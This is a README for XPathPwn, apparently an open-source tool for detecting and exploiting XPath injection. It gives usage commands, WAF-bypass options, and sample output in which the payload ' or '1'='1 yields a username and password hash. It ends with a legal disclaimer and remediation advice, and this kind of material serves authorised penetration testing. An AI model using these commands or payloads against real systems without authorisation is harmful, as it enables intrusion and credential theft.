# XPathPwn

<p align="center">
  <img src="https://img.shields.io/badge/version-2.0.2025-blue.svg" alt="Version">
  <img src="https://img.shields.io/badge/python-3.7+-green.svg" alt="Python">
  <img src="https://img.shields.io/badge/license-MIT-red.svg" alt="License">
  <img src="https://img.shields.io/badge/status-active-success.svg" alt="Status">
</p>

<p align="center">
  <b>Advanced XPath Injection Exploitation Tool</b><br>
  <i>Automated detection and exploitation of XPath injection vulnerabilities</i>
</p>

##  Features

- **Automatic Detection**: Identifies XPath injection vulnerabilities in web applications
- **Multiple Techniques**: Supports Union-based, Blind, and Error-based exploitation
- **Smart Recognition**: Automatically selects the best exploitation technique
- **WAF Bypass**: Built-in encoding and obfuscation techniques
- **Concurrent Extraction**: Multi-threaded blind injection for faster data retrieval
- **Comprehensive Reports**: Generates detailed JSON reports
- **Modern Payloads**: Updated for 2024 with the latest bypass techniques

##  Installation

### Requirements

- Python 3.7+
- pip

### Install from source

```bash
git clone https://github.com/skyfox-arch/xpathpwn.git
cd xpathpwn
pip install -r requirements.txt
```
**Install using pip**

```bash
pip install xpathpwn
```

## Quick Start

**Basic Usage**

```
# Basic scan
python xpathpwn.py -u http://target.com/search -p query

# POST request
python xpathpwn.py -u http://target.com/login -m POST -p username,password -d "user=test&pass=test"

# Multiple parameters
python xpathpwn.py -u http://target.com/form -p name,email,search,filter
```

**Advanced Usage**

```
# With authentication
python xpathpwn.py -u http://target.com/api -p filter -H "Authorization: Bearer token"

# Blind injection with custom indicators
python xpathpwn.py -u http://target.com/check -p id --true-string "Welcome" --false-string "Error"

# WAF bypass mode
python xpathpwn.py -u http://target.com/search -p q --waf-bypass --proxy http://127.0.0.1:8080

# Save results
python xpathpwn.py -u http://target.com/api -p search -o results.json -v
```

## Command Line Options

```
Required Arguments:
  -u, --url             Target URL
  -p, --params          Parameters to test (comma-separated)

Optional Arguments:
  -m, --method          HTTP method: GET or POST (default: GET)
  -d, --data            POST data (format: param1=value1&param2=value2)
  -H, --headers         Custom headers (can be used multiple times)
  -c, --cookies         Cookies (format: name1=value1; name2=value2)
  --proxy               Proxy URL (e.g., http://127.0.0.1:8080)
  --timeout             Request timeout in seconds (default: 10)
  --threads             Number of threads for blind injection (default: 10)

Detection Options:
  --true-string         String that indicates true condition
  --false-string        String that indicates false condition
  --technique           Injection technique: auto, union, blind, error (default: auto)

Output Options:
  -o, --output          Output file for results
  -v, --verbose         Verbose output

Advanced Options:
  --waf-bypass          Enable WAF bypass techniques
  --no-banner           Skip banner
```

## Example Output

```
 __  ______      _   _     ____                      
 \ \/ /  _ \ __ _| |_| |__ |  _ \__      ___ __  
  \  /| |_) / _` | __| '_ \| |_) \ \ /\ / / '_ \ 
  /  \|  __/ (_| | |_| | | |  __/ \ V  V /| | | |
 /_/\_\_|   \__,_|\__|_| |_|_|     \_/\_/ |_| |_| v2.0.2025
                                                  
Advanced XPath Injection Exploitation Tool
Developed by: https://github.com/skypoc
[!] Legal use only. You are responsible for your actions.

[*] Starting XPath injection scan...
[*] Target: http://vulnerable.com/search
[*] Method: GET
[*] Parameters: query

[*] Testing parameter: query
  [+] Vulnerable! Payload: ' or '1'='1

[+] Found 1 vulnerable parameter(s)

[*] Exploiting parameter: query
[*] Using technique: blind

[*] Extracting: First username
  [*] Length: 5
  [████████████████████████████████████████████████] 5/5 - admin

[*] Extracting: First password
  [*] Length: 32
  [████████████████████████████████████████████████] 32/32 - 5f4dcc3b5aa765d61d8327deb882cf99

============================================================
SCAN SUMMARY
============================================================
Target: http://vulnerable.com/search
Vulnerable Parameter: query
Total Extracted Items: 2

Extracted Data:
  First username: admin
  First password: 5f4dcc3b5aa765d61d8327deb882cf99

```

## Detection Techniques
1. Union-based Injection
Attempts to extract data using XPath union operators (|)

2. Blind Injection
Extracts data character by character using boolean conditions

3. Error-based Injection
Leverages error messages to extract information

## Advanced Features
### WAF Bypass Techniques
- Encoding: URL, HTML entity, Unicode encoding
- Case Variation: Mixed case for keywords
- Space Substitution: Comments, special characters
- Keyword Splitting: Breaking up filtered keywords

### Concurrent Extraction
Uses multi-threading to speed up blind injection:
- Parallel character extraction
- Optimized charset testing
- Binary search for length detection

## Report Format

The tool generates comprehensive JSON reports containing:
```json
{
  "scan_info": {
    "target": "http://target.com",
    "method": "GET",
    "scan_time": "2024-01-15T10:30:00",
    "vulnerable_param": "query"
  },
  "extracted_data": {
    "First username": "admin",
    "First password": "5f4dcc3b5aa765d61d8327deb882cf99"
  },
  "recommendations": [
    "Use parameterized XPath queries",
    "Implement input validation with whitelist",
    "Escape special XPath characters"
  ]
}
```

## ⚠️ Legal Disclaimer
**This tool is for educational and authorized testing purposes only.**

Users are responsible for complying with applicable laws and regulations. The developers assume no liability and are not responsible for any misuse or damage caused by this tool.

Always ensure you have explicit permission before testing any web application.

## Contributing
Contributions are welcome! Please feel free to submit a Pull Request.
- Fork the repository
- Create your feature branch (`git checkout -b feature/AmazingFeature`)
- Commit your changes (`git commit -m 'Add some AmazingFeature'`)
- Push to the branch (`git push origin feature/AmazingFeature`)
- Open a Pull Request

## License
This project is licensed under the MIT License - see the LICENSE file for details.

## Author

GitHub: @skypoc
